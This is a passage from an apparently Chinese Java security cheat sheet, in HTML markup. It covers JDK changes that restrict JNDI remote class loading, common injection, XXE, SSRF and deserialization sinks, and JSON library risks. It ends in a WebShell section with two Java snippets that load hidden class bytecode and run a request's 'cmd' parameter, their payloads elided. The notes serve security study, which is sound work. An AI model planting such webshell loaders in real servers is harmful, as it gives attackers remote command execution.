&lt;h3 id=&#34;8u191&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u191&#34;&gt;#&lt;/a&gt; 8u191&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u121&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u121&#34;&gt;#&lt;/a&gt; 8u121&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RMI 加入了反序列化白名单机制&lt;/li&gt;
&lt;li&gt;RMI 远程 Reference 代码默认不信任，影响 RMI 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u113&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u113&#34;&gt;#&lt;/a&gt; 8u113&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jdk-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-7&#34;&gt;#&lt;/a&gt; JDK 7&lt;/h2&gt;
&lt;h3 id=&#34;7u201&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7u201&#34;&gt;#&lt;/a&gt; 7u201&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7u122&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7u122&#34;&gt;#&lt;/a&gt; 7u122&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;7u40&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7u40&#34;&gt;#&lt;/a&gt; 7u40&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;java.io.File&lt;/code&gt;  类中添加了  &lt;code&gt;isInvalid&lt;/code&gt;  方法，检测文件名中是否包含空字节&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jdk-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-6&#34;&gt;#&lt;/a&gt; JDK 6&lt;/h2&gt;
&lt;h3 id=&#34;6u211&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6u211&#34;&gt;#&lt;/a&gt; 6u211&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;LDAP 远程 Reference 代码默认不信任，影响 LDAP 远程 Reference 代码攻击方式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6u141&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6u141&#34;&gt;#&lt;/a&gt; 6u141&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  默认为 false&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;6u45&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6u45&#34;&gt;#&lt;/a&gt; 6u45&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;java.rmi.server.useCodebaseOnly 默认为 true，禁用自动加载远程类文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;常见sink&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见sink&#34;&gt;#&lt;/a&gt; 常见 Sink&lt;/h1&gt;
&lt;h2 id=&#34;命令执行注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命令执行注入&#34;&gt;#&lt;/a&gt; 命令执行 / 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.lang.Runtime.getRuntime().exec()&lt;/li&gt;
&lt;li&gt;java.lang.ProcessBuilder&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;xxe&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;java.net.bull.javamelody.PayloadNameRequestWrapper&lt;/li&gt;
&lt;li&gt;javax.xml.bind.Unmarshaller&lt;/li&gt;
&lt;li&gt;javax.xml.parsers.DocumentBuilderFactory&lt;/li&gt;
&lt;li&gt;javax.xml.parsers.SAXParser&lt;/li&gt;
&lt;li&gt;javax.xml.stream.XMLStreamReader&lt;/li&gt;
&lt;li&gt;javax.xml.transform.sax.SAXSource&lt;/li&gt;
&lt;li&gt;javax.xml.transform.sax.SAXTransformerFactory&lt;/li&gt;
&lt;li&gt;javax.xml.transform.TransformerFactory&lt;/li&gt;
&lt;li&gt;javax.xml.validation.SchemaFactory&lt;/li&gt;
&lt;li&gt;javax.xml.validation.Validator&lt;/li&gt;
&lt;li&gt;javax.xml.xpath.XpathExpression&lt;/li&gt;
&lt;li&gt;org.apache.commons.digester3.Digester&lt;/li&gt;
&lt;li&gt;org.apache.ofbiz.base.util.UtilXml&lt;/li&gt;
&lt;li&gt;org.dom4j.io.SAXReader&lt;/li&gt;
&lt;li&gt;org.jdom.input.SAXBuilder&lt;/li&gt;
&lt;li&gt;org.jdom2.input.SAXBuilder&lt;/li&gt;
&lt;li&gt;org.xml.sax.helpers.XMLReaderFactory&lt;/li&gt;
&lt;li&gt;org.xml.sax.XMLReader&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ssrf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssrf&#34;&gt;#&lt;/a&gt; SSRF&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;HttpClient.execute&lt;/li&gt;
&lt;li&gt;HttpClients.execute&lt;/li&gt;
&lt;li&gt;HttpURLConnection.getInputStream&lt;/li&gt;
&lt;li&gt;ImageIO.read&lt;/li&gt;
&lt;li&gt;OkHttpClient.newCall.execute&lt;/li&gt;
&lt;li&gt;Request.Get.execute&lt;/li&gt;
&lt;li&gt;Request.Post.execute&lt;/li&gt;
&lt;li&gt;URL.openStream&lt;/li&gt;
&lt;li&gt;URLConnection.getInputStream&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;反序列化-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化-2&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h2&gt;
&lt;h3 id=&#34;相关sink函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关sink函数&#34;&gt;#&lt;/a&gt; 相关 Sink 函数&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;JSON.parseObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObjectInputStream.readObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObjectInputStream.readUnshared&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ObjectMapper.readValue&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XMLDecoder.readObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;XStream.fromXML&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Yaml.load&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;magic-call&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#magic-call&#34;&gt;#&lt;/a&gt; Magic Call&lt;/h3&gt;
&lt;p&gt;以下的魔术方法都会在反序列化过程中被自动的调用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;readObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readExternal&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readResolve&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;readObjectNoData&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;validateObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;finalize&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;主流json库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#主流json库&#34;&gt;#&lt;/a&gt; 主流 JSON 库&lt;/h3&gt;
&lt;p&gt;主流的 JSON 库有 Gson、Jackson、Fastjson 等，因为 JSON 常在反序列化中使用，所以相关库都有较大的影响。&lt;/p&gt;
&lt;p&gt;其中 Gson 默认只能反序列化基本类型，如果是复杂类型，需要程序员实现反序列化机制，相对比较安全。&lt;/p&gt;
&lt;p&gt;Jackson 除非指明 @jsonAutoDetect，Jackson 不会反序列化非 public 属性。在防御时，可以不使用 enableDefaultTyping 方法。相关 CVE 有 CVE-2017-7525、CVE-2017-15095。&lt;/p&gt;
&lt;p&gt;FastJson 是阿里巴巴的开源 JSON 解析库，支持将 Java Bean 序列化为 JSON 字符串，也支持从 JSON 字符串反序列化到 Java Bean，相关 CVE 有 CVE-2017-18349 等。&lt;/p&gt;
&lt;p&gt;FastJson 常见的 Sink 点有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;JSON.toJSONString&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JSON.parseObject&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;JSON.parse&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webshell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webshell&#34;&gt;#&lt;/a&gt; WebShell&lt;/h1&gt;
&lt;h2 id=&#34;bcel字节码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bcel字节码&#34;&gt;#&lt;/a&gt; BCEL 字节码&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; bcelCode &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;valueOf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassLoader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bcelCode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getConstructor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;toString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getBytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;自定义类加载器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义类加载器&#34;&gt;#&lt;/a&gt; 自定义类加载器&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;response&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassLoader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;shell&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;loadClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token annotation punctuation&#34;&gt;@Override&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;token generics&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;findClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; bytes &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Base64&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getDecoder&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;...&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;PermissionCollection&lt;/span&gt; pc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Permissions&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            pc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;AllPermission&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;ProtectionDomain&lt;/span&gt; protectionDomain &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ProtectionDomain&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;CodeSource&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Certificate&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; pc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;defineClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; bytes&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; bytes&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; protectionDomain&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Exception&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;super&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;findClass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span 